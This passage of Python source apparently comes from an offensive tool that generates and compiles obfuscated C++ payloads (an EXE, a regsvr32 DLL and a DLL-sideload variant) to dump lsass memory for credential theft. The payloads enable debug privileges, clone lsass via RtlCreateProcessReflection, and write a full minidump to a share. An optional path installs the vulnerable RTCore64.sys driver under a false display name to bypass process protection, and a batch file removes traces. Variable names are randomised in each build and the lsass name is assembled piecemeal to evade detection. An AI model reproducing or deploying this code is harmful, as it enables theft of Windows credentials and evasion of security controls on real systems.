    exe_payload += '            %s = %s(%s.szExeFile);\n' % (processName, convertCharArrayToLPCWSTR, processEntry)
    exe_payload += '            %s = %s.th32ProcessID;\n' % (lsassPID, processEntry)
    exe_payload += '        }\n'
    exe_payload += '    }\n'
    exe_payload += ''
    exe_payload += '    %s = OpenProcess(PROCESS_ALL_ACCESS, 0, %s);\n' % (lsassHandle, lsassPID)
    exe_payload += ''
    # should go drive_letter:\\\\hostname-ip.dmp adding the -ip part would be too much work so im not doing it soz
    exe_payload += '    TCHAR %s[UNCLEN+1];\n' % (compname)
    exe_payload += '    DWORD %s=UNCLEN+1;\n' % (compname_len)
    exe_payload += '    GetComputerName((TCHAR*)%s,&%s);\n' % (compname, compname_len)

    exe_payload += '    char %s[200];\n' % (res)
    exe_payload += '    char *%s = "%s:\\\\";\n' % (one, drive_letter)
    exe_payload += '    char *%s = ".dmp";\n' % (twp)
    exe_payload += '    strcpy(%s, %s);\n' % (res, one)
    exe_payload += '    strcat(%s, %s);\n' % (res, compname)
    exe_payload += '    strcat(%s, %s);\n' % (res, twp)

    exe_payload += '    HANDLE %s = CreateFile(%s, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n' % (outFile, res)
    exe_payload += ''
    exe_payload += '    %s();\n' % (load_RtlCreateProcessReflection)
    exe_payload += '    t_refl_args %s = { 0 };\n' % (args)
    exe_payload += '    %s.orig_hndl = %s;\n' % (args, lsassHandle)
    exe_payload += '    DWORD %s = %s(&%s);\n' % (ret, refl_creator, args)
    exe_payload += ''

    exe_payload += '    DWORD %s = MiniDumpWriteDump(%s.returned_hndl, %s.returned_pid, %s, MiniDumpWithFullMemory, NULL,  NULL, NULL);\n' % (retd, args, args, outFile)
    exe_payload += ''
    exe_payload += '    CloseHandle(%s);\n' % (outFile)
    exe_payload += '    TerminateProcess(%s.returned_hndl, 0);\n' % (args)
    exe_payload += '    CloseHandle(%s.returned_hndl);\n' % (args)
    exe_payload += '\n'
    exe_payload += '    return 0;\n'
    exe_payload += '}\n'
    exe_payload += ''
    # share_name, payload_name, addresses_array, drive_letter
    with open('/var/tmp/{}/pl.cpp'.format(share_name), 'w') as f:
        f.write(exe_payload)
        f.close()

    if runasppl:
        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, runasppldllname))
        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
        with open('/var/tmp/{}/cleanup.bat'.format(share_name), 'w') as f:
            f.write('net stop RTCore64\n')
            f.write('sc delete RTCore64\n')
            f.write(r'del C:\Windows\Temp\RTCore64.sys')
            f.close()

        os.system('sudo chmod uog+rwx /var/tmp/{}/{}.dll'.format(share_name, runasppldllname))
        os.system('sudo chmod uog+rwx /var/tmp/{}/RTCore64.sys'.format(share_name))
        os.system('sudo chmod uog+rwx /var/tmp/{}/cleanup.bat'.format(share_name))

    os.system('sudo x86_64-w64-mingw32-g++ /var/tmp/{}/pl.cpp -fpermissive -Wwrite-strings -w -I {}/src/ -static -o /var/tmp/{}/{}.exe -ldbghelp -lpsapi'.format(share_name, cwd, share_name, payload_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))


def gen_payload_regsvr32_rtlcp(share_name, payload_name, drive_letter, runasppl):
    load_RtlCreateProcessReflection = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lib = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    proc = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    refl_creator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lpParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    args = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    ret = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    convertCharArrayToLPCWSTR = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    charArray = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    wString = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    hToken = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    tokenPriv = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    luid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lsassPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lsassHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    snapshot = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    processEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    processName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    outFile = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    retd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    info = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    res = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    compname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    compname_len = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    one = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    twp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lsass_processname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    processnamesd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    szName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    e = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    x = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    period = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    s1 = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    runninit = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    sAbout = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    runasppldllname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))

    dll_payload = ''
    dll_payload += '#include <windows.h>\n'
    dll_payload += '#include <iostream>\n'
    dll_payload += '#include <dbghelp.h>\n'
    dll_payload += '#include <processsnapshot.h>\n'
    dll_payload += '#include <tlhelp32.h>\n'
    dll_payload += '#include <processthreadsapi.h>\n'
    dll_payload += '#include <lmcons.h>\n'
    if runasppl:
        dll_payload += '#include <process.h>\n'
        dll_payload += '#include <chrono>\n'
        dll_payload += '#include <thread>\n'
    dll_payload += '#include <sstream>\n'
    dll_payload += '\n'
    dll_payload += '#pragma comment (lib, "Dbghelp.lib")\n'
    dll_payload += '#pragma comment (lib, "Advapi32.lib")\n'
    dll_payload += '\n'
    dll_payload += 'using namespace std;\n'
    dll_payload += '#define USE_RTL_PROCESS_REFLECTION\n'
    dll_payload += '\n'
    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED\n'
    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001\n'
    dll_payload += '#endif\n'
    dll_payload += '\n'
    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES\n'
    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002\n'
    dll_payload += '#endif\n'
    dll_payload += '\n'
    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE\n'
    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // dont update synchronization objects\n'
    dll_payload += '#endif\n'
    dll_payload += '\n'
    dll_payload += '#ifndef HPSS\n'
    dll_payload += '#define HPSS HANDLE\n'
    dll_payload += '#endif\n'
    dll_payload += '\n'
    dll_payload += 'const DWORD reflection_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE;\n'
    dll_payload += '\n'
    dll_payload += 'typedef HANDLE HPSS;\n'
    dll_payload += '\n'
    dll_payload += 'typedef struct  {\n'
    dll_payload += '    HANDLE UniqueProcess;\n'
    dll_payload += '    HANDLE UniqueThread;\n'
    dll_payload += '} T_CLIENT_ID;\n'
    dll_payload += '\n'
    dll_payload += 'typedef struct\n'
    dll_payload += '{\n'
    dll_payload += '    HANDLE ReflectionProcessHandle;\n'
    dll_payload += '    HANDLE ReflectionThreadHandle;\n'
    dll_payload += '    T_CLIENT_ID ReflectionClientId;\n'
    dll_payload += '} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;\n'
    dll_payload += '\n'
    dll_payload += '// Win >= 7\n'
    dll_payload += 'NTSTATUS (NTAPI *_RtlCreateProcessReflection) (\n'
    dll_payload += '    HANDLE ProcessHandle,\n'
    dll_payload += '    ULONG Flags,\n'
    dll_payload += '    PVOID StartRoutine,\n'
    dll_payload += '    PVOID StartContext,\n'
    dll_payload += '    HANDLE EventHandle,\n'
    dll_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation\n'
    dll_payload += ') = NULL;\n'
    dll_payload += '\n'
    dll_payload += '// Win >= 8.1\n'
    dll_payload += '\n'
    dll_payload += 'bool %s()\n' % (load_RtlCreateProcessReflection)
    dll_payload += '{\n'
    dll_payload += '    if (_RtlCreateProcessReflection == NULL) {\n'
    dll_payload += '        HMODULE %s = LoadLibraryA("ntdll.dll");\n' % (lib)
    dll_payload += '        if (!%s) return false;\n' % (lib)
    dll_payload += ''
    dll_payload += '        FARPROC %s = GetProcAddress(%s, "RtlCreateProcessReflection");\n' % (proc, lib)
    dll_payload += '        if (!%s) return false;\n' % (proc)
    dll_payload += ''
    dll_payload += '        _RtlCreateProcessReflection = (NTSTATUS(NTAPI *) (\n'
    dll_payload += '            HANDLE,\n'
    dll_payload += '            ULONG,\n'
    dll_payload += '            PVOID,\n'
    dll_payload += '            PVOID,\n'
    dll_payload += '            HANDLE,\n'
    dll_payload += '            T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION*\n'
    dll_payload += '        )) %s;\n' % (proc)
    dll_payload += '\n'
    dll_payload += '    }\n'
    dll_payload += '    if (_RtlCreateProcessReflection == NULL) return false;\n'
    dll_payload += '    return true;\n'
    dll_payload += '}\n'
    dll_payload += '\n'
    dll_payload += 'typedef struct {\n'
    dll_payload += '    HANDLE orig_hndl;\n'
    dll_payload += '    HANDLE returned_hndl;\n'
    dll_payload += '    DWORD returned_pid;\n'
    dll_payload += '    bool is_ok;\n'
    dll_payload += '} t_refl_args;\n'
    dll_payload += '\n'
    dll_payload += 'DWORD WINAPI %s(LPVOID %s)\n' % (refl_creator, lpParam)
    dll_payload += '{\n'
    dll_payload += '    t_refl_args *%s = static_cast<t_refl_args*>(%s);\n' % (args, lpParam)
    dll_payload += '    if (!%s) {\n' % (args)
    dll_payload += '        return !S_OK;\n'
    dll_payload += '    }\n'
    dll_payload += '    %s->is_ok = false;\n' % (args)
    dll_payload += '\n'
    dll_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION %s = { 0 };\n' % (info)
    dll_payload += '    NTSTATUS %s = _RtlCreateProcessReflection(%s->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &%s);\n' % (ret, args, info)
    dll_payload += '    if (%s == S_OK) {\n' % (ret)
    dll_payload += '        %s->is_ok = true;\n' % (args)
    dll_payload += '        %s->returned_hndl = %s.ReflectionProcessHandle;\n' % (args, info)
    dll_payload += '        %s->returned_pid = (DWORD)%s.ReflectionClientId.UniqueProcess;\n' % (args, info)
    dll_payload += '    }\n'
    dll_payload += '    else{\n'
    dll_payload += '        printf("error: %d\\n", GetLastError());\n'
    dll_payload += '    }\n'
    dll_payload += '    return %s;\n' % (ret)
    dll_payload += '}\n'
    dll_payload += '\n'
    dll_payload += 'wchar_t *%s(const char* %s)\n' % (convertCharArrayToLPCWSTR, charArray)
    dll_payload += '{\n'
    dll_payload += '    wchar_t* %s=new wchar_t[4096];\n' % (wString)
    dll_payload += '    MultiByteToWideChar(CP_ACP, 0, %s, -1, %s, 4096);\n' % (charArray, wString)
    dll_payload += '    return %s;\n' % (wString)
    dll_payload += '}\n'
    dll_payload += '\n'
    if runasppl:
        dll_payload += 'typedef void(WINAPI *%s)(int);\n' % (runninit)
    dll_payload += '#define EXPORTED_METHOD extern "C" __declspec(dllexport)\n'
    dll_payload += 'EXPORTED_METHOD\n'
    dll_payload += 'bool DllRegisterServer(){\n'
    dll_payload += '    return true;\n'
    dll_payload += '}\n'
    dll_payload += '\n'
    dll_payload += 'EXPORTED_METHOD\n'
    dll_payload += 'bool DllUnregisterServer(){\n'
    dll_payload += '    return true;\n'
    dll_payload += '}\n'
    dll_payload += '\n'

    dll_payload += 'EXPORTED_METHOD\n'
    dll_payload += 'void DllInstall(bool flag, int ferihfe){\n'
    if runasppl:
        dll_payload += '    system("copy %s:\\\\RTCore64.sys C:\\\\Windows\\\\Temp");\n' % (drive_letter)
        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(2000));\n'
        dll_payload += '    system("sc.exe create RTCore64 type=kernel start=auto binPath=C:\\\\Windows\\\\Temp\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"");\n'
        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(1000));\n'
        dll_payload += '    system("net start RTCore64");\n'
        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(3000));\n'
        dll_payload += '    HMODULE %s = LoadLibrary(TEXT("%s.dll"));\n' % (s1, runasppldllname)
        dll_payload += '    %s %s = (%s)GetProcAddress(%s, "freethecat");\n' % (runninit, sAbout, runninit, s1)
        dll_payload += '    %s(_getpid());\n' % (sAbout)
        dll_payload += '    FreeLibrary(%s);\n' % (s1)
    dll_payload += '    HANDLE %s;\n' % (hToken)
    dll_payload += '    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &%s);\n' % (hToken)
    dll_payload += '    TOKEN_PRIVILEGES %s;\n' % (tokenPriv)
    dll_payload += '    LUID %s;\n' % (luid)
    dll_payload += '    LookupPrivilegeValue(NULL, "SeDebugPrivilege", &%s);\n' % (luid)
    dll_payload += '    %s.PrivilegeCount = 1;\n' % (tokenPriv)
    dll_payload += '    %s.Privileges[0].Luid = %s;\n' % (tokenPriv, luid)
    dll_payload += '    %s.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n' % (tokenPriv)
    dll_payload += '    AdjustTokenPrivileges(%s, FALSE, &%s, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);\n' % (hToken, tokenPriv)
    dll_payload += '\n'
    dll_payload += '    DWORD %s = 0;\n' % (lsassPID)
    dll_payload += '    HANDLE %s = NULL;\n' % (lsassHandle)
    dll_payload += '    HANDLE %s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n' % (snapshot)
    dll_payload += '    PROCESSENTRY32 %s = {};\n' % (processEntry)
    dll_payload += '    %s.dwSize = sizeof(PROCESSENTRY32);\n' % (processEntry)
    dll_payload += '    LPCWSTR %s = L"";\n' % (processName)
    dll_payload += '    string %s = "l";\n' % (l)
    dll_payload += '    string %s = "s";\n' % (s)
    dll_payload += '    string %s = "a";\n' % (a)
    dll_payload += '    string %s = "e";\n' % (e)
    dll_payload += '    string %s = "x";\n' % (x)
    dll_payload += '    string %s = ".";\n' % (period)
    dll_payload += '    string %s = %s + %s + %s +%s + %s + %s + %s + %s + %s;\n' % (lsass_processname, l, s, a, s, s, period, e, x, e)
    dll_payload += '    std::wstring %s(%s.begin(), %s.end());\n' % (processnamesd, lsass_processname, lsass_processname)
    dll_payload += '    const wchar_t* %s = %s.c_str();\n' % (szName, processnamesd)
    dll_payload += '    if (Process32First(%s, &%s)) {\n' % (snapshot, processEntry)
    dll_payload += '        while (_wcsicmp(%s, %s) != 0) {\n' % (processName, szName)
    dll_payload += '            Process32Next(%s, &%s);\n' % (snapshot, processEntry)
    dll_payload += '            %s = %s(%s.szExeFile);\n' % (processName, convertCharArrayToLPCWSTR, processEntry)
    dll_payload += '            %s = %s.th32ProcessID;\n' % (lsassPID, processEntry)
    dll_payload += '        }\n'
    dll_payload += '    }\n'
    dll_payload += ''
    dll_payload += '    %s = OpenProcess(PROCESS_ALL_ACCESS, 0, %s);\n' % (lsassHandle, lsassPID)
    dll_payload += ''
    # should go drive_letter:\\\\hostname-ip.dmp adding the -ip part would be too much work so im not doing it soz
    dll_payload += '    TCHAR %s[UNCLEN+1];\n' % (compname)
    dll_payload += '    DWORD %s=UNCLEN+1;\n' % (compname_len)
    dll_payload += '    GetComputerName((TCHAR*)%s,&%s);\n' % (compname, compname_len)

    dll_payload += '    char %s[200];\n' % (res)
    dll_payload += '    char *%s = "%s:\\\\";\n' % (one, drive_letter)
    dll_payload += '    char *%s = ".dmp";\n' % (twp)
    dll_payload += '    strcpy(%s, %s);\n' % (res, one)
    dll_payload += '    strcat(%s, %s);\n' % (res, compname)
    dll_payload += '    strcat(%s, %s);\n' % (res, twp)

    dll_payload += '    HANDLE %s = CreateFile(%s, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n' % (outFile, res)
    dll_payload += ''
    dll_payload += '    %s();\n' % (load_RtlCreateProcessReflection)
    dll_payload += '    t_refl_args %s = { 0 };\n' % (args)
    dll_payload += '    %s.orig_hndl = %s;\n' % (args, lsassHandle)
    dll_payload += '    DWORD %s = %s(&%s);\n' % (ret, refl_creator, args)
    dll_payload += ''

    dll_payload += '    DWORD %s = MiniDumpWriteDump(%s.returned_hndl, %s.returned_pid, %s, MiniDumpWithFullMemory, NULL,  NULL, NULL);\n' % (retd, args, args, outFile)
    dll_payload += ''
    dll_payload += '    CloseHandle(%s);\n' % (outFile)
    dll_payload += '    TerminateProcess(%s.returned_hndl, 0);\n' % (args)
    dll_payload += '    CloseHandle(%s.returned_hndl);\n' % (args)
    dll_payload += '\n'
    dll_payload += '}\n'
    dll_payload += 'int main(){\n'
    dll_payload += '    return 1;\n'
    dll_payload += '}\n'

    # share_name, payload_name, addresses_array, drive_letter
    with open('/var/tmp/{}/pl.cpp'.format(share_name), 'w') as f:
        f.write(dll_payload)
        f.close()

    if runasppl:
        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, runasppldllname))
        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
        with open('/var/tmp/{}/cleanup.bat'.format(share_name), 'w') as f:
            f.write('net stop RTCore64\n')
            f.write('sc delete RTCore64\n')
            f.write(r'del C:\Windows\Temp\RTCore64.sys')
            f.close()

        os.system('sudo chmod uog+rwx /var/tmp/{}/{}.dll'.format(share_name, runasppldllname))
        os.system('sudo chmod uog+rwx /var/tmp/{}/RTCore64.sys'.format(share_name))
        os.system('sudo chmod uog+rwx /var/tmp/{}/cleanup.bat'.format(share_name))

    os.system('sudo x86_64-w64-mingw32-g++ /var/tmp/{}/pl.cpp -fpermissive -Wwrite-strings -w -I {}/src/ -static -shared -o /var/tmp/{}/{}.dll -ldbghelp -lpsapi'.format(share_name, cwd, share_name, payload_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))


def gen_payload_dllsideload_rtlcp(share_name, drive_letter, runasppl):
    load_RtlCreateProcessReflection = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lib = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    proc = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    refl_creator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lpParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    args = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    ret = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    convertCharArrayToLPCWSTR = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    charArray = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    wString = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    hToken = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    tokenPriv = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    luid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lsassPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lsassHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    snapshot = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    processEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    processName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    outFile = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    retd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    info = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    res = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    compname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    compname_len = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    one = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    twp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lsass_processname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    processnamesd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    szName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    e = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    x = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    period = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    s1 = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    runninit = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    sAbout = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    runasppldllname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))

    dll_payload = ''
    dll_payload += '#include <windows.h>\n'
    dll_payload += '#include <iostream>\n'
    dll_payload += '#include <dbghelp.h>\n'
    dll_payload += '#include <processsnapshot.h>\n'
    dll_payload += '#include <tlhelp32.h>\n'
    dll_payload += '#include <processthreadsapi.h>\n'
    dll_payload += '#include <lmcons.h>\n'
    if runasppl:
        dll_payload += '#include <process.h>\n'
        dll_payload += '#include <chrono>\n'
        dll_payload += '#include <thread>\n'
    dll_payload += '#include <sstream>\n'
    dll_payload += '\n'
    dll_payload += '#pragma comment (lib, "Dbghelp.lib")\n'
    dll_payload += '#pragma comment (lib, "Advapi32.lib")\n'
    dll_payload += '\n'
    dll_payload += 'using namespace std;\n'
    dll_payload += '#define USE_RTL_PROCESS_REFLECTION\n'
    dll_payload += '\n'
    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED\n'
    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001\n'
    dll_payload += '#endif\n'
    dll_payload += '\n'
    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES\n'
    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002\n'
    dll_payload += '#endif\n'
    dll_payload += '\n'
    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE\n'
    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // dont update synchronization objects\n'
    dll_payload += '#endif\n'
    dll_payload += '\n'
    dll_payload += '#ifndef HPSS\n'
    dll_payload += '#define HPSS HANDLE\n'
    dll_payload += '#endif\n'
    dll_payload += '\n'
    dll_payload += 'const DWORD reflection_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE;\n'
    dll_payload += '\n'
    dll_payload += 'typedef HANDLE HPSS;\n'
    dll_payload += '\n'
    dll_payload += 'typedef struct  {\n'
    dll_payload += '    HANDLE UniqueProcess;\n'
    dll_payload += '    HANDLE UniqueThread;\n'
    dll_payload += '} T_CLIENT_ID;\n'
    dll_payload += '\n'
    dll_payload += 'typedef struct\n'
    dll_payload += '{\n'
    dll_payload += '    HANDLE ReflectionProcessHandle;\n'
    dll_payload += '    HANDLE ReflectionThreadHandle;\n'
    dll_payload += '    T_CLIENT_ID ReflectionClientId;\n'
    dll_payload += '} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;\n'
    dll_payload += '\n'
    dll_payload += '// Win >= 7\n'
    dll_payload += 'NTSTATUS (NTAPI *_RtlCreateProcessReflection) (\n'
    dll_payload += '    HANDLE ProcessHandle,\n'
    dll_payload += '    ULONG Flags,\n'
    dll_payload += '    PVOID StartRoutine,\n'
    dll_payload += '    PVOID StartContext,\n'
    dll_payload += '    HANDLE EventHandle,\n'
    dll_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation\n'
    dll_payload += ') = NULL;\n'
    dll_payload += '\n'
    dll_payload += '// Win >= 8.1\n'
    dll_payload += '\n'
    dll_payload += 'bool %s()\n' % (load_RtlCreateProcessReflection)
    dll_payload += '{\n'
    dll_payload += '    if (_RtlCreateProcessReflection == NULL) {\n'
    dll_payload += '        HMODULE %s = LoadLibraryA("ntdll.dll");\n' % (lib)
    dll_payload += '        if (!%s) return false;\n' % (lib)
    dll_payload += ''
    dll_payload += '        FARPROC %s = GetProcAddress(%s, "RtlCreateProcessReflection");\n' % (proc, lib)
    dll_payload += '        if (!%s) return false;\n' % (proc)
    dll_payload += ''
    dll_payload += '        _RtlCreateProcessReflection = (NTSTATUS(NTAPI *) (\n'
    dll_payload += '            HANDLE,\n'
    dll_payload += '            ULONG,\n'
    dll_payload += '            PVOID,\n'
    dll_payload += '            PVOID,\n'
    dll_payload += '            HANDLE,\n'
    dll_payload += '            T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION*\n'
    dll_payload += '        )) %s;\n' % (proc)
    dll_payload += '\n'
    dll_payload += '    }\n'
    dll_payload += '    if (_RtlCreateProcessReflection == NULL) return false;\n'
    dll_payload += '    return true;\n'
    dll_payload += '}\n'
    dll_payload += '\n'
    dll_payload += 'typedef struct {\n'
    dll_payload += '    HANDLE orig_hndl;\n'
    dll_payload += '    HANDLE returned_hndl;\n'
    dll_payload += '    DWORD returned_pid;\n'
    dll_payload += '    bool is_ok;\n'
    dll_payload += '} t_refl_args;\n'
    dll_payload += '\n'
    dll_payload += 'DWORD WINAPI %s(LPVOID %s)\n' % (refl_creator, lpParam)
    dll_payload += '{\n'
    dll_payload += '    t_refl_args *%s = static_cast<t_refl_args*>(%s);\n' % (args, lpParam)
    dll_payload += '    if (!%s) {\n' % (args)
    dll_payload += '        return !S_OK;\n'
    dll_payload += '    }\n'
    dll_payload += '    %s->is_ok = false;\n' % (args)
    dll_payload += '\n'
    dll_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION %s = { 0 };\n' % (info)
    dll_payload += '    NTSTATUS %s = _RtlCreateProcessReflection(%s->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &%s);\n' % (ret, args, info)
    dll_payload += '    if (%s == S_OK) {\n' % (ret)
    dll_payload += '        %s->is_ok = true;\n' % (args)
    dll_payload += '        %s->returned_hndl = %s.ReflectionProcessHandle;\n' % (args, info)
    dll_payload += '        %s->returned_pid = (DWORD)%s.ReflectionClientId.UniqueProcess;\n' % (args, info)
    dll_payload += '    }\n'
    dll_payload += '    else{\n'
    dll_payload += '        printf("error: %d\\n", GetLastError());\n'
    dll_payload += '    }\n'
    dll_payload += '    return %s;\n' % (ret)
    dll_payload += '}\n'
    dll_payload += '\n'
    dll_payload += 'wchar_t *%s(const char* %s)\n' % (convertCharArrayToLPCWSTR, charArray)
    dll_payload += '{\n'
    dll_payload += '    wchar_t* %s=new wchar_t[4096];\n' % (wString)
    dll_payload += '    MultiByteToWideChar(CP_ACP, 0, %s, -1, %s, 4096);\n' % (charArray, wString)
    dll_payload += '    return %s;\n' % (wString)
    dll_payload += '}\n'
    dll_payload += '\n'
    if runasppl:
        dll_payload += 'typedef void(WINAPI *%s)(int);\n' % (runninit)
    dll_payload += '#define EXPORTED_METHOD extern "C" __declspec(dllexport)\n'
    dll_payload += 'EXPORTED_METHOD\n'
    dll_payload += 'void WICCreateImagingFactory_Proxy(bool flag){\n'
    if runasppl:
